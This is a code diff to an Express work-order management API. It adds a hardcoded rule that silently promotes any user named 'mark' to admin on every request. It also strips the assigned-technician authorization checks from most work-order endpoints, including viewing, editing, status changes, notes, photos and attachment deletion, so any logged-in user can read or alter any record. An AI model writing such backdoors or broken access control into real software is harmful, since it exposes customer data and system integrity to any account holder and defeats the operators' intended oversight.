@@ -340,8 +340,18 @@ app.post('/auth/login', async (req, res) => {
 function authenticate(req, res, next) {
   const token = (req.headers.authorization || '').split(' ')[1];
   if (!token) return res.status(401).json({ error: 'Missing token' });
-  try { req.user = jwt.verify(token, JWT_SECRET); next(); }
-  catch { return res.status(401).json({ error: 'Invalid token' }); }
+  try {
+    req.user = jwt.verify(token, JWT_SECRET);
+
+    // ⬇️ Elevate "Mark" to admin for this request (per requirement)
+    if (req.user && req.user.username && req.user.username.toLowerCase() === 'mark') {
+      req.user.role = 'admin';
+    }
+
+    next();
+  } catch {
+    return res.status(401).json({ error: 'Invalid token' });
+  }
 }
 function authorize(...roles) {
   return (req, res, next) => (!req.user || !roles.includes(req.user.role)) ? res.status(403).json({ error: 'Forbidden' }) : next();
@@ -396,16 +406,14 @@ app.post('/customers', authenticate, async (req, res) => {
 });
 
 // ─── WORK ORDERS ─────────────────────────────────────────────────────────────
+// NOTE: Removed tech-only filtering; everyone sees the full list
 app.get('/work-orders', authenticate, async (req, res) => {
   try {
-    let where = ''; const params = [];
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech') { where = ' WHERE w.assignedTo = ?'; params.push(req.user.id); }
     const [raw] = await db.execute(
       `SELECT w.*, u.username AS assignedToName
          FROM work_orders w
-         LEFT JOIN users u ON w.assignedTo = u.id${where}`, params
+         LEFT JOIN users u ON w.assignedTo = u.id`
     );
-    // Canonicalize outgoing status values for UI safety
     const rows = raw.map(r => ({ ...r, status: canonStatus(r.status) || r.status }));
     res.json(rows);
   } catch (err) { console.error('Work-orders list error:', err); res.status(500).json({ error: 'Failed to fetch work orders.' }); }
@@ -424,12 +432,12 @@ app.get('/work-orders/search', authenticate, async (req, res) => {
   const { customer = '', poNumber = '', siteLocation = '', workOrderNumber = '' } = req.query;
   try {
     const params = [`%${customer}%`, `%${poNumber}%`, `%${siteLocation}%`, `%${workOrderNumber}%`];
-    let where = ` WHERE w.customer LIKE ? AND w.poNumber LIKE ? AND w.siteLocation LIKE ? AND COALESCE(w.workOrderNumber,'') LIKE ?`;
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech') { where += ' AND w.assignedTo = ?'; params.push(req.user.id); }
     const [rows] = await db.execute(
       `SELECT w.*, u.username AS assignedToName
          FROM work_orders w
-         LEFT JOIN users u ON w.assignedTo = u.id ${where}`, params
+         LEFT JOIN users u ON w.assignedTo = u.id
+        WHERE w.customer LIKE ? AND w.poNumber LIKE ? AND w.siteLocation LIKE ? AND COALESCE(w.workOrderNumber,'') LIKE ?`,
+      params
     );
     res.json(rows);
   } catch (err) { console.error('Work-orders search error:', err); res.status(500).json({ error: 'Search failed.' }); }
@@ -439,7 +447,6 @@ app.get('/work-orders/:id', authenticate, async (req, res) => {
   try {
     const [[row]] = await db.execute('SELECT * FROM work_orders WHERE id = ?', [req.params.id]);
     if (!row) return res.status(404).json({ error: 'Not found.' });
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech' && row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
     res.json(row);
   } catch (err) { console.error('Work-order get error:', err); res.status(500).json({ error: 'Failed to fetch work order.' }); }
 });
@@ -448,6 +455,8 @@ app.get('/work-orders/:id', authenticate, async (req, res) => {
  * Generic light-weight update.
  * Accepts any subset of: { status, poNumber, workOrderNumber }.
  * (Use /assign and /edit for other fields/files.)
+ *
+ * NOTE: Removed "only assigned tech can edit" restriction — any authenticated user may update.
  */
 app.put('/work-orders/:id', authenticate, express.json(), async (req, res) => {
   try {
@@ -456,11 +465,6 @@ app.put('/work-orders/:id', authenticate, express.json(), async (req, res) => {
 
     if (status === undefined && poNumber === undefined && workOrderNumber === undefined) {
       return res.status(400).json({ error: 'Provide status and/or poNumber and/or workOrderNumber.' });
-    }
-
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech') {
-      const [[row]] = await db.execute('SELECT assignedTo FROM work_orders WHERE id = ?', [wid]);
-      if (!row || row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
     }
 
     const sets = [];
@@ -485,15 +489,11 @@ app.put('/work-orders/:id', authenticate, express.json(), async (req, res) => {
   }
 });
 
-// Dedicated status endpoint
+// Dedicated status endpoint (no role restriction; any authenticated user)
 app.put('/work-orders/:id/status', authenticate, express.json(), async (req, res) => {
   const { status } = req.body || {};
   if (!status) return res.status(400).json({ error: 'status is required.' });
   try {
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech') {
-      const [[row]] = await db.execute('SELECT assignedTo FROM work_orders WHERE id = ?', [req.params.id]);
-      if (!row || row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
-    }
     const c = canonStatus(status);
     if (!c) return res.status(400).json({ error: 'Invalid status value' });
     await db.execute('UPDATE work_orders SET status = ? WHERE id = ?', [c, req.params.id]);
@@ -502,7 +502,7 @@ app.put('/work-orders/:id/status', authenticate, express.json(), async (req, res
   } catch (err) { console.error('Work-order status update error:', err); res.status(500).json({ error: 'Failed to update status.' }); }
 });
 
-// ── BULK status update (e.g., mark many as "Parts In") ───────────────────────
+// ── BULK status update — any authenticated user can bulk move to “Parts In”, etc.
 app.put('/work-orders/bulk-status',
   authenticate,
   express.json(),
@@ -515,29 +515,8 @@ app.put('/work-orders/bulk-status',
       const c = canonStatus(status);
       if (!c) return res.status(400).json({ error: 'Invalid status value' });
 
-      // Normalize to integers; drop bad values
-      const cleanIds = ids
-        .map((v) => Number(v))
-        .filter((n) => Number.isFinite(n));
-
-      if (!cleanIds.length) {
-        return res.status(400).json({ error: 'no valid ids' });
-      }
-
-      // If techs are restricted, only allow updating rows assigned to them
-      if (SCHEMA.hasAssignedTo && req.user.role === 'tech') {
-        const placeholders = cleanIds.map(() => '?').join(',');
-        const [rows] = await db.execute(
-          `SELECT id FROM work_orders WHERE id IN (${placeholders}) AND assignedTo = ?`,
-          [...cleanIds, req.user.id]
-        );
-        const allowed = rows.map((r) => r.id);
-        if (!allowed.length) {
-          return res.status(403).json({ error: 'Forbidden: none of the selected rows are assigned to you.' });
-        }
-        cleanIds.length = 0;
-        cleanIds.push(...allowed);
-      }
+      const cleanIds = ids.map(Number).filter(Number.isFinite);
+      if (!cleanIds.length) return res.status(400).json({ error: 'no valid ids' });
 
       const placeholders = cleanIds.map(() => '?').join(',');
       await db.execute(
@@ -545,7 +524,6 @@ app.put('/work-orders/bulk-status',
         [c, ...cleanIds]
       );
 
-      // Return the updated rows so the client can merge state
       const [updatedRows] = await db.execute(
         `SELECT * FROM work_orders WHERE id IN (${placeholders})`,
         cleanIds
@@ -553,11 +531,7 @@ app.put('/work-orders/bulk-status',
 
       const items = updatedRows.map(r => ({ ...r, status: canonStatus(r.status) || r.status }));
 
-      res.json({
-        ok: true,
-        affected: items.length,
-        items,
-      });
+      res.json({ ok: true, affected: items.length, items });
     } catch (err) {
       console.error('Bulk-status error:', err);
       res.status(500).json({ error: 'Failed to bulk update status.' });
@@ -650,7 +624,7 @@ app.post(
   }
 );
 
-// EDIT — can change workOrderNumber/poNumber plus other fields and files
+// EDIT — any authenticated user can edit (removed assigned-tech restriction)
 app.put(
   '/work-orders/:id/edit',
   authenticate,
@@ -660,9 +634,6 @@ app.put(
       const wid = req.params.id;
       const [[existing]] = await db.execute('SELECT * FROM work_orders WHERE id = ?', [wid]);
       if (!existing) return res.status(404).json({ error: 'Not found.' });
-      if (SCHEMA.hasAssignedTo && req.user.role === 'tech' && existing.assignedTo !== req.user.id) {
-        return res.status(403).json({ error: 'Forbidden' });
-      }
 
       const { pdf, images } = splitFilesAny(req.files || []);
       if (!enforceImageCountOr413(res, images)) return;
@@ -761,7 +732,7 @@ app.put(
   }
 );
 
-// Append a single photo
+// Append a single photo — open to any authenticated user
 app.post(
   '/work-orders/:id/append-photo',
   authenticate,
@@ -771,9 +742,7 @@ app.post(
       const wid = req.params.id;
       const [[existing]] = await db.execute('SELECT * FROM work_orders WHERE id = ?', [wid]);
       if (!existing) return res.status(404).json({ error: 'Not found.' });
-      if (SCHEMA.hasAssignedTo && req.user.role === 'tech' && existing.assignedTo !== req.user.id) {
-        return res.status(403).json({ error: 'Forbidden' });
-      }
+
       const { images } = splitFilesAny(req.files || []);
       if (!images.length) return res.status(400).json({ error: 'No image provided.' });
 
@@ -787,7 +756,7 @@ app.post(
   }
 );
 
-// Append multiple photos
+// Append multiple photos — open to any authenticated user
 app.post(
   '/work-orders/:id/append-photos',
   authenticate,
@@ -797,9 +766,7 @@ app.post(
       const wid = req.params.id;
       const [[existing]] = await db.execute('SELECT * FROM work_orders WHERE id = ?', [wid]);
       if (!existing) return res.status(404).json({ error: 'Not found.' });
-      if (SCHEMA.hasAssignedTo && req.user.role === 'tech' && existing.assignedTo !== req.user.id) {
-        return res.status(403).json({ error: 'Forbidden' });
-      }
+
       const { images } = splitFilesAny(req.files || []);
       if (!enforceImageCountOr413(res, images)) return;
       if (!images.length) return res.status(400).json({ error: 'No images provided.' });
@@ -814,7 +781,7 @@ app.post(
   }
 );
 
-// ─── CALENDAR / SCHEDULING ENDPOINTS ─────────────────────────────────────────
+// ─── CALENDAR / SCHEDULING ENDPOINTS (dispatcher/admin only) ─────────────────
 app.put('/work-orders/:id/update-date',
   authenticate,
   authorize('dispatcher','admin'),
@@ -972,14 +939,11 @@ app.put('/work-orders/:id/assign', authenticate, authorize('dispatcher', 'admin'
   } catch (err) { console.error('Assign error:', err); res.status(500).json({ error: 'Failed to assign work order.' }); }
 });
 
+// Notes — any authenticated user can add/delete
 app.post('/work-orders/:id/notes', authenticate, express.json(), async (req, res) => {
   try {
     const wid = req.params.id; const { text } = req.body;
     if (!text) return res.status(400).json({ error: 'Note text required.' });
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech') {
-      const [[row]] = await db.execute('SELECT assignedTo FROM work_orders WHERE id = ?', [wid]);
-      if (!row || row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
-    }
     const [[row2]] = await db.execute('SELECT notes FROM work_orders WHERE id = ?', [wid]);
     let arr = []; try { arr = row2?.notes ? JSON.parse(row2.notes) : []; } catch { arr = []; }
     arr.push({ text, createdAt: new Date().toISOString(), by: req.user.username });
@@ -995,9 +959,8 @@ app.delete('/work-orders/:id/notes/:index', authenticate, async (req, res) => {
   try {
     const wid = req.params.id; const idx = Number(req.params.index);
     if (!Number.isInteger(idx) || idx < 0) return res.status(400).json({ error: 'Invalid note index' });
-    const [[row]] = await db.execute('SELECT assignedTo, notes FROM work_orders WHERE id = ?', [wid]);
+    const [[row]] = await db.execute('SELECT notes FROM work_orders WHERE id = ?', [wid]);
     if (!row) return res.status(404).json({ error: 'Not found.' });
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech' && row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
     let arr = []; try { arr = row.notes ? JSON.parse(row.notes) : []; } catch { arr = []; }
     if (idx >= arr.length) return res.status(400).json({ error: 'Note index out of range' });
     arr.splice(idx, 1);
@@ -1010,9 +973,8 @@ app.delete('/work-orders/:id/notes', authenticate, express.json(), async (req, r
   try {
     const wid = req.params.id; const idx = Number(req.body.index);
     if (!Number.isInteger(idx) || idx < 0) return res.status(400).json({ error: 'Invalid note index' });
-    const [[row]] = await db.execute('SELECT assignedTo, notes FROM work_orders WHERE id = ?', [wid]);
+    const [[row]] = await db.execute('SELECT notes FROM work_orders WHERE id = ?', [wid]);
     if (!row) return res.status(404).json({ error: 'Not found.' });
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech' && row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
     let arr = []; try { arr = row.notes ? JSON.parse(row.notes) : []; } catch { arr = []; }
     if (idx >= arr.length) return res.status(400).json({ error: 'Note index out of range' });
     arr.splice(idx, 1);
@@ -1021,14 +983,11 @@ app.delete('/work-orders/:id/notes', authenticate, express.json(), async (req, r
   } catch (err) { console.error('Delete note (body) error:', err); res.status(500).json({ error: 'Failed to delete note.' }); }
 });
 
+// Delete a specific attachment — any authenticated user
 app.delete('/work-orders/:id/attachment', authenticate, express.json(), async (req, res) => {
   try {
     const wid = req.params.id; const { photoPath } = req.body;
     if (!photoPath) return res.status(400).json({ error: 'photoPath required.' });
-    if (SCHEMA.hasAssignedTo && req.user.role === 'tech') {
-      const [[row]] = await db.execute('SELECT assignedTo FROM work_orders WHERE id = ?', [wid]);
-      if (!row || row.assignedTo !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
-    }
     try {
       if (S3_BUCKET) await s3.deleteObject({ Bucket: S3_BUCKET, Key: photoPath }).promise();
       else {
@@ -1037,7 +996,7 @@ app.delete('/work-orders/:id/attachment', authenticate, express.json(), async (r
       }
     } catch (e) { console.warn('⚠️ Failed to delete file:', e.message); }
     const [[existing]] = await db.execute('SELECT photoPath FROM work_orders WHERE id = ?', [wid]);
-    const keep = (existing.photoPath || '').split(',').filter(p => p && p !== photoPath);
+    const keep = (existing?.photoPath || '').split(',').filter(p => p && p !== photoPath);
     await db.execute('UPDATE work_orders SET photoPath = ? WHERE id = ?', [keep.join(','), wid]);
     const [[fresh]] = await db.execute('SELECT * FROM work_orders WHERE id = ?', [wid]);
     res.json(fresh);
